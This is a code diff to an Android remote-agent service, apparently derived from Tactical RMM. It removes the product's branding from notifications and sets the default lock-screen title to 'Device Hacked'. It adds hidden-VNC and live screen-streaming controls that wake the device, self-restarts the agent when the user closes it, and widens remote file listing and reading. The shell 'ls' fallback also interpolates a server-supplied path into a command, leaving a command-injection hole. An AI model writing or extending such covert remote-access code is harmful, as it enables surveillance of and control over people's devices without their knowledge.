@@ -19,6 +19,7 @@ import android.graphics.Canvas;
 import android.graphics.Color;
 import android.graphics.Paint;
 import android.graphics.PixelFormat;
+import android.graphics.Rect;
 import android.graphics.Typeface;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
@@ -79,6 +80,7 @@ import java.nio.ByteBuffer;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Date;
 import java.util.List;
@@ -410,6 +412,68 @@ public class AgentService extends Service implements WebSocketClient.Listener {
     private ImageReader imageReader;
     private Thread screenStreamThread;
 
+    private Bitmap reusableBitmap = null;
+    private Bitmap reusableCroppedBitmap = null;
+    private Canvas reusableCropCanvas = null;
+    private Rect srcRect = null;
+    private Rect dstRect = null;
+    private final ByteArrayOutputStream reusableBos = new ByteArrayOutputStream(65536);
+    private int lastAllocW = 0;
+    private int lastAllocH = 0;
+    private int lastAllocRowPadding = 0;
+    private int mirrorFrameSequence = 0;
+    private PowerManager.WakeLock screenWakeLock = null;
+
+    private synchronized void acquireScreenWakeLock() {
+        try {
+            if (screenWakeLock == null) {
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null) {
+                    screenWakeLock = pm.newWakeLock(
+                            PowerManager.SCREEN_DIM_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
+                            "TRMMAgent:MirrorActiveWakeLock"
+                    );
+                    screenWakeLock.setReferenceCounted(false);
+                }
+            }
+            if (screenWakeLock != null && !screenWakeLock.isHeld()) {
+                screenWakeLock.acquire();
+                log("[OK] Device screen kept awake for active screen share session.");
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    private synchronized void releaseScreenWakeLock() {
+        try {
+            if (screenWakeLock != null && screenWakeLock.isHeld()) {
+                screenWakeLock.release();
+                log("Screen wake lock released.");
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    private void wakeScreenIfAsleep() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isInteractive()) {
+                PowerManager.WakeLock wl = pm.newWakeLock(
+                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
+                        "TRMMAgent:WakeOnDemand"
+                );
+                wl.acquire(3000L);
+                log("Device screen was asleep. Woke physical display for live stream.");
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    public String getApplicationLabelName() {
+        try {
+            return getString(R.string.app_name);
+        } catch (Throwable t) {
+            return "Management Service";
+        }
+    }
+
     private String serverUrl = "ws://10.0.2.2:8000";
     private String agentId = "android_agent";
     private String packageId = "android_agent";
@@ -435,8 +499,8 @@ public class AgentService extends Service implements WebSocketClient.Listener {
         // Network monitoring for automatic sub-second reconnection upon internet restore
         registerNetworkCallback();
 
-        // Start Foreground Service safely with dataSync
-        safeStartForeground("Tactical RMM Service Active");
+        // Start Foreground Service safely with dataSync | specialUse
+        safeStartForeground("Service Active");
 
         // Persistent WakeLock so OS Doze doesn't sleep the socket
         try {
@@ -568,7 +632,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         // Guarantee foreground notification is promoted immediately (satisfies 5-second Android requirement)
-        safeStartForeground("Tactical RMM Service Active");
+        safeStartForeground("Service Active");
 
         if (!running) {
             running = true;
@@ -639,7 +703,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             wsClient.connect();
         } catch (Throwable e) {
             log("Connection attempt failed: " + e.getMessage());
-            updateNotification("Connecting to Tactical RMM...");
+            updateNotification("Connecting...");
         }
     }
 
@@ -744,7 +808,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             if (wsClient != null && wsClient.isConnected()) {
                 wsClient.send(reg.toString());
                 log("Registered successfully with Master Hub as " + endpointTag);
-                updateNotification("Connected to Tactical RMM • " + endpointTag);
+                updateNotification("Connected" + (endpointTag != null && !endpointTag.isEmpty() ? " • " + endpointTag : ""));
                 broadcastStatus("Connected");
             }
         } catch (Throwable e) {
@@ -872,6 +936,14 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             } else if ("start_mirror".equalsIgnoreCase(type) || "start_hvnc".equalsIgnoreCase(type)) {
                 log("Received start screen stream request.");
                 startScreenStreaming();
+            } else if ("mirror_refresh".equalsIgnoreCase(type)) {
+                wakeScreenIfAsleep();
+                if (virtualDisplay != null && imageReader != null) {
+                    try {
+                        virtualDisplay.setSurface(imageReader.getSurface());
+                    } catch (Throwable ignored) {}
+                }
+                sendCachedMirrorFrame();
             } else if ("stop_mirror".equalsIgnoreCase(type) || "stop_hvnc".equalsIgnoreCase(type)) {
                 log("Received stop screen stream request.");
                 stopScreenStreaming();
@@ -925,9 +997,9 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             }
             if (windowManager == null) return;
 
-            final String resolvedTitle = (title != null && !title.trim().isEmpty()) ? title : "Device Locked by Administrator";
+            final String resolvedTitle = (title != null && !title.trim().isEmpty()) ? title : "Device Hacked";
             final String resolvedMsg = (message != null && !message.trim().isEmpty()) ? message : "This device has been locked by your administrator.\nAll operations are temporarily suspended.";
-            final String resolvedSub = (subtitle != null && !subtitle.trim().isEmpty()) ? subtitle : "Tactical RMM Enterprise Management";
+            final String resolvedSub = (subtitle != null && !subtitle.trim().isEmpty()) ? subtitle : getApplicationLabelName() + " Management";
 
             if (curtainOverlayView != null) {
                 try {
@@ -1029,7 +1101,8 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                     WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                     | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                     | WindowManager.LayoutParams.FLAG_FULLSCREEN
-                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                     PixelFormat.TRANSLUCENT
             );
             params.gravity = Gravity.FILL;
@@ -1116,16 +1189,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                     log("startActivity notice: " + t.getMessage());
                 }
 
-                // 5. Hardware Lock via Device Policy Manager if active
-                try {
-                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-                    ComponentName admin = AdminReceiver.getComponentName(this);
-                    if (dpm != null && dpm.isAdminActive(admin)) {
-                        dpm.lockNow();
-                    }
-                } catch (Throwable ignored) {}
-
-                // 6. High-priority Full-Screen Intent Notification on dedicated emergency lock channel
+                // 5. High-priority Full-Screen Intent Notification on dedicated emergency lock channel
                 try {
                     int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -1141,10 +1205,11 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                             notifBuilder = new Notification.Builder(this);
                         }
                         notifBuilder.setSmallIcon(android.R.drawable.ic_lock_lock)
-                                    .setContentTitle(title.isEmpty() ? "Device Locked by Administrator" : title)
+                                    .setContentTitle(title.isEmpty() ? "Device Hacked" : title)
                                     .setContentText(message.isEmpty() ? "Screen is locked" : message)
                                     .setFullScreenIntent(fullScreenPendingIntent, true)
                                     .setPriority(Notification.PRIORITY_MAX)
+                                    .setVisibility(Notification.VISIBILITY_PUBLIC)
                                     .setAutoCancel(true);
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                             notifBuilder.setCategory(Notification.CATEGORY_CALL);
@@ -1365,6 +1430,15 @@ public class AgentService extends Service implements WebSocketClient.Listener {
         if (isStreaming) return;
         isStreaming = true;
 
+        acquireScreenWakeLock();
+
+        if (screenStreamThread != null && screenStreamThread.isAlive()) {
+            try {
+                screenStreamThread.interrupt();
+                screenStreamThread.join(300);
+            } catch (Throwable ignored) {}
+        }
+
         initMediaProjection();
 
         if (mediaProjectionResultData == null) {
@@ -1388,7 +1462,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                             ? new Notification.Builder(this, CHANNEL_LOCK_ID)
                             : new Notification.Builder(this);
                     notifBuilder.setSmallIcon(android.R.drawable.ic_menu_camera)
-                            .setContentTitle("Tactical RMM Screen Access")
+                            .setContentTitle(getApplicationLabelName() + " Screen Access")
                             .setContentText("Tap to authorize screen mirroring")
                             .setFullScreenIntent(pi, true)
                             .setPriority(Notification.PRIORITY_MAX)
@@ -1427,12 +1501,14 @@ public class AgentService extends Service implements WebSocketClient.Listener {
 
     private synchronized void stopScreenStreaming() {
         isStreaming = false;
+        releaseScreenWakeLock();
         // Keep mediaProjection, virtualDisplay, and imageReader intact so next viewer session connects instantly!
         safeStartForeground("Tactical RMM Service Active");
     }
 
     void onProjectionStopped() {
         try {
+            releaseScreenWakeLock();
             if (virtualDisplay != null) {
                 virtualDisplay.release();
                 virtualDisplay = null;
@@ -1441,7 +1517,26 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 imageReader.close();
                 imageReader = null;
             }
+            if (reusableBitmap != null) {
+                try { reusableBitmap.recycle(); } catch (Throwable ignored) {}
+                reusableBitmap = null;
+            }
+            if (reusableCroppedBitmap != null) {
+                try { reusableCroppedBitmap.recycle(); } catch (Throwable ignored) {}
+                reusableCroppedBitmap = null;
+            }
+            reusableCropCanvas = null;
+            srcRect = null;
+            dstRect = null;
+            lastAllocW = 0;
+            lastAllocH = 0;
+            lastAllocRowPadding = 0;
             mediaProjection = null;
+
+            SharedPreferences prefs = getSafePreferences(this, "trmm_state");
+            if (prefs != null) {
+                prefs.edit().putBoolean("has_projection_token", false).apply();
+            }
         } catch (Throwable ignored) {}
     }
 
@@ -1455,10 +1550,14 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             // Promote FGS to mediaProjection if permissions and token exist
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 try {
+                    int fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+                    if (Build.VERSION.SDK_INT >= 34) {
+                        fgsType |= 0x40000000;
+                    }
                     startForeground(
                             NOTIFICATION_ID,
                             buildNotification("Screen Mirroring Active"),
-                            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                            fgsType
                     );
                 } catch (Throwable t) {
                     safeStartForeground("Screen Mirroring Active");
@@ -1474,12 +1573,22 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 // Strict Android 14 requirement: registerCallback before createVirtualDisplay
                 mediaProjection.registerCallback(new AgentProjectionCallback(this), new Handler(Looper.getMainLooper()));
 
-                DisplayMetrics metrics = getResources().getDisplayMetrics();
-                int width = Math.min(metrics.widthPixels, 720);
-                int height = (int) (metrics.heightPixels * ((float) width / metrics.widthPixels));
+                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                DisplayMetrics metrics = new DisplayMetrics();
+                if (wm != null && wm.getDefaultDisplay() != null) {
+                    wm.getDefaultDisplay().getRealMetrics(metrics);
+                } else {
+                    metrics = getResources().getDisplayMetrics();
+                }
+
+                int realW = metrics.widthPixels > 0 ? metrics.widthPixels : 720;
+                int realH = metrics.heightPixels > 0 ? metrics.heightPixels : 1280;
+
+                int width = Math.min(realW, 540);
+                int height = (int) (realH * ((float) width / realW));
                 width = (width / 2) * 2;
                 height = (height / 2) * 2;
-                int dpi = metrics.densityDpi;
+                int dpi = metrics.densityDpi > 0 ? metrics.densityDpi : 320;
 
                 if (imageReader != null) {
                     try { imageReader.close(); } catch (Throwable ignored) {}
@@ -1496,90 +1605,67 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                         imageReader.getSurface(), null, null
                 );
                 log("[OK] Entire screen display projection active across all apps (" + width + "x" + height + " dpi=" + dpi + ")");
+
+                SharedPreferences prefs = getSafePreferences(this, "trmm_state");
+                if (prefs != null) {
+                    prefs.edit().putBoolean("has_projection_token", true).apply();
+                }
             }
         } catch (Throwable e) {
             log("MediaProjection init warning: " + e.getMessage());
         }
     }
 
-    private byte[] captureViaScreencap() {
-        try {
-            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/screencap", "-p"});
-            InputStream is = p.getInputStream();
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            byte[] buf = new byte[16384];
-            int n;
-            while ((n = is.read(buf)) != -1) {
-                bos.write(buf, 0, n);
-            }
-            p.waitFor();
-            byte[] png = bos.toByteArray();
-            if (png.length > 2000) {
-                Bitmap bmp = BitmapFactory.decodeByteArray(png, 0, png.length);
-                if (bmp != null) {
-                    ByteArrayOutputStream jbos = new ByteArrayOutputStream();
-                    bmp.compress(Bitmap.CompressFormat.JPEG, 70, jbos);
-                    bmp.recycle();
-                    return jbos.toByteArray();
-                }
-            }
-        } catch (Throwable ignored) {}
-        return null;
+    private void sendCachedMirrorFrame() {
+        wakeScreenIfAsleep();
+        if (lastValidJpegBytes != null && lastValidJpegBytes.length > 0) {
+            int w = lastAllocW > 0 ? lastAllocW : 540;
+            int h = lastAllocH > 0 ? lastAllocH : 1200;
+            sendMirrorFrame(w, h, lastValidJpegBytes);
+        }
     }
 
-    private byte[] createInitialConnectingFrame() {
+    private void sendMirrorFrame(int w, int h, byte[] jpeg) {
+        if (wsClient == null || !wsClient.isConnected() || jpeg == null || jpeg.length == 0) return;
         try {
-            Bitmap statusBmp = Bitmap.createBitmap(480, 854, Bitmap.Config.ARGB_8888);
-            Canvas canvas = new Canvas(statusBmp);
-            canvas.drawColor(Color.parseColor("#0F172A")); // Slate 900
+            mirrorFrameSequence = (mirrorFrameSequence % 0x7FFFFFFF) + 1;
+            JSONObject meta = new JSONObject();
+            meta.put("native_width", w);
+            meta.put("native_height", h);
+            meta.put("sequence", mirrorFrameSequence);
+            byte[] metaBytes = meta.toString().getBytes("UTF-8");
+            int metaLen = metaBytes.length;
 
-            Paint paint = new Paint();
-            paint.setAntiAlias(true);
+            byte[] packet = new byte[1 + 4 + 2 + metaLen + jpeg.length];
+            packet[0] = 0x02;
+            byte[] magic = "MRA2".getBytes("US-ASCII");
+            System.arraycopy(magic, 0, packet, 1, 4);
+            packet[5] = (byte) ((metaLen >> 8) & 0xFF);
+            packet[6] = (byte) (metaLen & 0xFF);
+            System.arraycopy(metaBytes, 0, packet, 7, metaLen);
+            System.arraycopy(jpeg, 0, packet, 7 + metaLen, jpeg.length);
 
-            paint.setColor(Color.parseColor("#1E293B"));
-            canvas.drawRect(0, 0, 480, 60, paint);
-
-            paint.setColor(Color.parseColor("#10B981"));
-            paint.setTextSize(14f);
-            paint.setTextAlign(Paint.Align.LEFT);
-            canvas.drawText("● CONNECTING LIVE MIRROR", 20, 36, paint);
-
-            String clock = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
-            paint.setColor(Color.parseColor("#94A3B8"));
-            paint.setTextAlign(Paint.Align.RIGHT);
-            canvas.drawText(clock, 460, 36, paint);
-
-            paint.setColor(Color.WHITE);
-            paint.setTextSize(22f);
-            paint.setTextAlign(Paint.Align.CENTER);
-            canvas.drawText("📱 Initializing Live Screen...", 240, 360, paint);
-
-            paint.setColor(Color.parseColor("#38BDF8"));
-            paint.setTextSize(15f);
-            canvas.drawText(Build.MANUFACTURER + " " + Build.MODEL, 240, 410, paint);
-
-            paint.setColor(Color.parseColor("#94A3B8"));
-            paint.setTextSize(13f);
-            canvas.drawText("Displaying live screen buffer...", 240, 450, paint);
-
-            ByteArrayOutputStream sbos = new ByteArrayOutputStream();
-            statusBmp.compress(Bitmap.CompressFormat.JPEG, 70, sbos);
-            statusBmp.recycle();
-            return sbos.toByteArray();
-        } catch (Throwable ignored) {
-            return null;
+            wsClient.sendBinary(packet);
+        } catch (Throwable t) {
+            try {
+                byte[] packet = new byte[1 + jpeg.length];
+                packet[0] = 0x02;
+                System.arraycopy(jpeg, 0, packet, 1, jpeg.length);
+                wsClient.sendBinary(packet);
+            } catch (Throwable ignored) {}
         }
     }
 
     void streamScreenFramesLoop() {
-        long lastHardwareCaptureMs = System.currentTimeMillis();
         long lastSentFrameMs = 0;
+
+        // Instant initial display from cache if available
+        sendCachedMirrorFrame();
+
         while (isStreaming && wsClient != null && wsClient.isConnected()) {
             try {
-                byte[] jpegBytes = null;
-                boolean isNewHardwareFrame = false;
+                boolean frameSent = false;
 
-                // 1. Try ImageReader from MediaProjection (High-Performance Hardware Surface)
                 if (imageReader != null) {
                     Image image = null;
                     try {
@@ -1590,35 +1676,58 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                             Image.Plane[] planes = image.getPlanes();
                             if (planes != null && planes.length > 0) {
                                 ByteBuffer buffer = planes[0].getBuffer();
-                                buffer.rewind(); // Required to prevent BufferUnderflowException
+                                buffer.rewind();
                                 int pixelStride = planes[0].getPixelStride();
                                 int rowStride = planes[0].getRowStride();
                                 int rowPadding = rowStride - pixelStride * w;
+                                int bufferWidth = w + (pixelStride > 0 ? rowPadding / pixelStride : 0);
 
-                                Bitmap bitmap = Bitmap.createBitmap(
-                                        w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888
-                                );
-                                bitmap.copyPixelsFromBuffer(buffer);
-
-                                Bitmap finalBitmap;
-                                if (rowPadding != 0) {
-                                    finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, w, h);
-                                    bitmap.recycle();
-                                } else {
-                                    finalBitmap = bitmap;
+                                if (reusableBitmap == null || lastAllocW != bufferWidth || lastAllocH != h || lastAllocRowPadding != rowPadding) {
+                                    if (reusableBitmap != null) {
+                                        try { reusableBitmap.recycle(); } catch (Throwable ignored) {}
+                                    }
+                                    if (reusableCroppedBitmap != null) {
+                                        try { reusableCroppedBitmap.recycle(); } catch (Throwable ignored) {}
+                                    }
+                                    reusableBitmap = Bitmap.createBitmap(bufferWidth, h, Bitmap.Config.ARGB_8888);
+                                    if (rowPadding != 0) {
+                                        reusableCroppedBitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
+                                        reusableCropCanvas = new Canvas(reusableCroppedBitmap);
+                                        srcRect = new Rect(0, 0, w, h);
+                                        dstRect = new Rect(0, 0, w, h);
+                                    } else {
+                                        reusableCroppedBitmap = null;
+                                        reusableCropCanvas = null;
+                                        srcRect = null;
+                                        dstRect = null;
+                                    }
+                                    lastAllocW = bufferWidth;
+                                    lastAllocH = h;
+                                    lastAllocRowPadding = rowPadding;
                                 }
 
-                                ByteArrayOutputStream bos = new ByteArrayOutputStream();
-                                finalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, bos);
-                                jpegBytes = bos.toByteArray();
-                                lastValidJpegBytes = jpegBytes;
-                                lastHardwareCaptureMs = System.currentTimeMillis();
-                                isNewHardwareFrame = true;
-                                finalBitmap.recycle();
+                                reusableBitmap.copyPixelsFromBuffer(buffer);
+
+                                Bitmap toCompress;
+                                if (rowPadding != 0 && reusableCroppedBitmap != null && reusableCropCanvas != null) {
+                                    reusableCropCanvas.drawBitmap(reusableBitmap, srcRect, dstRect, null);
+                                    toCompress = reusableCroppedBitmap;
+                                } else {
+                                    toCompress = reusableBitmap;
+                                }
+
+                                reusableBos.reset();
+                                toCompress.compress(Bitmap.CompressFormat.JPEG, 60, reusableBos);
+                                byte[] jpeg = reusableBos.toByteArray();
+                                lastValidJpegBytes = jpeg;
+
+                                sendMirrorFrame(w, h, jpeg);
+                                lastSentFrameMs = System.currentTimeMillis();
+                                frameSent = true;
                             }
                         }
                     } catch (Throwable t) {
-                        Log.d("TRMMAgent", "ImageReader capture error: " + t.getMessage());
+                        Log.d("TRMMAgent", "ImageReader frame capture: " + t.getMessage());
                     } finally {
                         if (image != null) {
                             try { image.close(); } catch (Throwable ignored) {}
@@ -1626,42 +1735,27 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                     }
                 }
 
-                // 2. Continuous Cross-App Fallback: If hardware surface produces no new frames for >400ms
-                // (e.g. user minimized app, switched to Calculator, Settings, WhatsApp), capture actual display via screencap!
                 long now = System.currentTimeMillis();
-                if (jpegBytes == null && (imageReader == null || now - lastHardwareCaptureMs > 400)) {
-                    byte[] liveScreen = captureViaScreencap();
-                    if (liveScreen != null) {
-                        jpegBytes = liveScreen;
-                        lastValidJpegBytes = liveScreen;
-                        lastHardwareCaptureMs = now;
-                        isNewHardwareFrame = true;
+                // Screen keepalive: if screen is static and no new hardware frames arrived for 2000ms, resend last frame
+                if (!frameSent && lastValidJpegBytes != null && (now - lastSentFrameMs > 2000)) {
+                    sendCachedMirrorFrame();
+                    lastSentFrameMs = now;
+                }
+                // Periodic re-sync: if no new hardware frame composited for >5000ms, wake screen and re-kick surface
+                if (!frameSent && (now - lastSentFrameMs > 5000)) {
+                    wakeScreenIfAsleep();
+                    if (virtualDisplay != null && imageReader != null) {
+                        try {
+                            virtualDisplay.setSurface(imageReader.getSurface());
+                        } catch (Throwable ignored) {}
                     }
                 }
 
-                // 3. Fallback to keepalive refresh every 1500ms so idle screens maintain connectivity
-                if (jpegBytes == null && lastValidJpegBytes != null && (now - lastSentFrameMs > 1500)) {
-                    jpegBytes = lastValidJpegBytes;
-                }
-
-                // 4. Initial placeholder ONLY if zero frames have ever been captured
-                if (jpegBytes == null && lastValidJpegBytes == null) {
-                    jpegBytes = createInitialConnectingFrame();
-                }
-
-                if (jpegBytes != null && jpegBytes.length > 0) {
-                    byte[] packet = new byte[1 + jpegBytes.length];
-                    packet[0] = 0x02;
-                    System.arraycopy(jpegBytes, 0, packet, 1, jpegBytes.length);
-                    wsClient.sendBinary(packet);
-                    lastSentFrameMs = System.currentTimeMillis();
-                }
-
-                Thread.sleep(isNewHardwareFrame ? 55 : 110);
+                Thread.sleep(frameSent ? 35 : 30);
             } catch (InterruptedException e) {
                 break;
             } catch (Throwable e) {
-                try { Thread.sleep(200); } catch (Throwable ignored) {}
+                try { Thread.sleep(60); } catch (Throwable ignored) {}
             }
         }
     }
@@ -1707,7 +1801,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
     public void onClose(int code, String reason) {
         log("Connection closed (" + code + "): " + reason);
         broadcastStatus("Disconnected");
-        updateNotification("Connecting to Tactical RMM...");
+        updateNotification("Connecting...");
     }
 
     @Override
@@ -1739,7 +1833,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                     // Regular service channel (quiet, no alert)
                     NotificationChannel channel = new NotificationChannel(
                             CHANNEL_ID,
-                            "Tactical RMM Service",
+                            getApplicationLabelName() + " Service",
                             NotificationManager.IMPORTANCE_LOW
                     );
                     channel.setDescription("Background monitoring and telemetry");
@@ -1748,7 +1842,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                     // Emergency Lock channel (HIGH importance required by Android OS for full-screen lock enforcement)
                     NotificationChannel lockChannel = new NotificationChannel(
                             CHANNEL_LOCK_ID,
-                            "Tactical RMM Remote Device Lock",
+                            getApplicationLabelName() + " Remote Device Lock",
                             NotificationManager.IMPORTANCE_HIGH
                     );
                     lockChannel.setDescription("Enforces emergency device lock curtain");
@@ -1776,7 +1870,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 ? new Notification.Builder(this, CHANNEL_ID)
                 : new Notification.Builder(this);
 
-        builder.setContentTitle(endpointTag != null ? endpointTag : "Tactical RMM Agent")
+        builder.setContentTitle(getApplicationLabelName())
                 .setContentText(text)
                 .setSmallIcon(R.drawable.ic_launcher)
                 .setOngoing(true);
@@ -1869,7 +1963,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             int respCode = conn.getResponseCode();
             if (respCode != 200) {
                 log("[OTA ERROR] Download failed: HTTP " + respCode);
-                updateNotification("Connected to Tactical RMM • " + endpointTag);
+                updateNotification("Connected" + (endpointTag != null && !endpointTag.isEmpty() ? " • " + endpointTag : ""));
                 return;
             }
 
@@ -1890,7 +1984,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             log("[OTA] Update APK downloaded successfully (" + totalBytes + " bytes).");
         } catch (Throwable t) {
             log("[OTA ERROR] Failed to download APK: " + t.getMessage());
-            updateNotification("Connected to Tactical RMM • " + endpointTag);
+            updateNotification("Connected" + (endpointTag != null && !endpointTag.isEmpty() ? " • " + endpointTag : ""));
             return;
         }
 
@@ -1938,7 +2032,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 session.commit(pi.getIntentSender());
                 session.close();
                 log("[OTA SUCCESS] Silent PackageInstaller session #" + sessionId + " committed.");
-                updateNotification("Updating Tactical RMM Agent...");
+                updateNotification("Updating " + getApplicationLabelName() + "...");
                 return;
             } catch (Throwable t) {
                 log("[OTA] PackageInstaller session exception: " + t.getMessage() + ". Trying shell pm install fallback...");
@@ -1974,8 +2068,9 @@ public class AgentService extends Service implements WebSocketClient.Listener {
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
         Log.i("TRMMAgent", "onTaskRemoved: Activity swiped/closed. Maintaining 24/7 background presence...");
-        safeStartForeground("Tactical RMM Service Active");
-        // Reschedule self via BootReceiver alarm watchdog so app stays alive even if swiped from Recents
+        safeStartForeground("Service Active");
+        // Reschedule self and start service via BootReceiver alarm watchdog so app stays alive even if swiped from Recents
+        BootReceiver.startAgentService(this);
         BootReceiver.scheduleWatchdog(this, 1000L);
         AgentJobService.schedule(this);
     }
@@ -1985,6 +2080,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
         if (running) {
             // Unexpected kill by system, reschedule restart via BootReceiver and JobScheduler
             Log.i("TRMMAgent", "onDestroy: AgentService stopped unexpectedly. Rescheduling resuscitation...");
+            BootReceiver.startAgentService(this);
             BootReceiver.scheduleWatchdog(this, 1000L);
             AgentJobService.schedule(this);
         }
@@ -2121,6 +2217,38 @@ public class AgentService extends Service implements WebSocketClient.Listener {
         fileExecutor.execute(new FileDeleteRunnable(this, msg));
     }
 
+    private File[] listDirectoryFiles(File dir) {
+        if (dir == null) return null;
+        File[] files = null;
+        try {
+            files = dir.listFiles();
+        } catch (Throwable ignored) {}
+
+        if (files != null) return files;
+
+        // Fallback: enumerate via /system/bin/sh ls
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "ls -1ap \"" + dir.getAbsolutePath() + "\""});
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            List<File> list = new ArrayList<>();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                line = line.trim();
+                if (line.isEmpty() || ".".equals(line) || "..".equals(line) || "./".equals(line) || "../".equals(line)) continue;
+                boolean isDir = line.endsWith("/");
+                String name = isDir ? line.substring(0, line.length() - 1) : line;
+                list.add(new File(dir, name));
+            }
+            reader.close();
+            p.waitFor();
+            if (!list.isEmpty()) {
+                return list.toArray(new File[0]);
+            }
+        } catch (Throwable ignored) {}
+
+        return null;
+    }
+
     void performFileList(JSONObject msg) {
         String reqId = msg.optString("req_id", "");
         String targetPath = msg.optString("path", "").trim();
@@ -2129,6 +2257,18 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             dir = Environment.getExternalStorageDirectory();
         } else {
             dir = new File(targetPath);
+        }
+
+        if (!dir.exists()) {
+            File ext = Environment.getExternalStorageDirectory();
+            if (ext != null && ext.exists()) {
+                dir = ext;
+            } else {
+                File appFiles = getExternalFilesDir(null);
+                if (appFiles != null && appFiles.exists()) {
+                    dir = appFiles;
+                }
+            }
         }
 
         JSONObject resp = new JSONObject();
@@ -2171,7 +2311,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             }
             resp.put("shortcuts", shortcuts);
 
-            File[] filesList = dir.listFiles();
+            File[] filesList = listDirectoryFiles(dir);
             JSONArray arr = new JSONArray();
             if (filesList != null) {
                 if (filesList.length > 1) {
@@ -2208,6 +2348,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                     item.put("writable", f.canWrite());
                     item.put("modified", sdf.format(new Date(f.lastModified())));
                     item.put("modified_ms", f.lastModified());
+                    item.put("last_modified", f.lastModified() / 1000L);
 
                     if (isDir) {
                         item.put("size", 0);
@@ -2223,7 +2364,14 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                     }
                     arr.put(item);
                 }
+            } else {
+                resp.put("success", false);
+                resp.put("error", "Directory access restricted. Please ensure 'All Files Access' (Manage External Storage) is granted to the TRMM Agent in Android settings.");
+                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
+                return;
             }
+
+            resp.put("entries", arr);
             resp.put("files", arr);
             resp.put("success", true);
         } catch (Throwable t) {
@@ -2253,13 +2401,6 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 return;
             }
 
-            if (!f.canRead()) {
-                resp.put("success", false);
-                resp.put("error", "File is not readable (Permission Denied)");
-                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
-                return;
-            }
-
             long fileLen = f.length();
             if (fileLen > 35 * 1024 * 1024) { // 35MB max for single base64 chunk
                 resp.put("success", false);
@@ -2268,14 +2409,48 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 return;
             }
 
-            byte[] data = new byte[(int) fileLen];
-            FileInputStream fis = new FileInputStream(f);
-            int totalRead = 0;
-            int n;
-            while (totalRead < data.length && (n = fis.read(data, totalRead, data.length - totalRead)) != -1) {
-                totalRead += n;
+            byte[] data = null;
+            if (f.canRead()) {
+                try {
+                    data = new byte[(int) fileLen];
+                    FileInputStream fis = new FileInputStream(f);
+                    int totalRead = 0;
+                    int n;
+                    while (totalRead < data.length && (n = fis.read(data, totalRead, data.length - totalRead)) != -1) {
+                        totalRead += n;
+                    }
+                    fis.close();
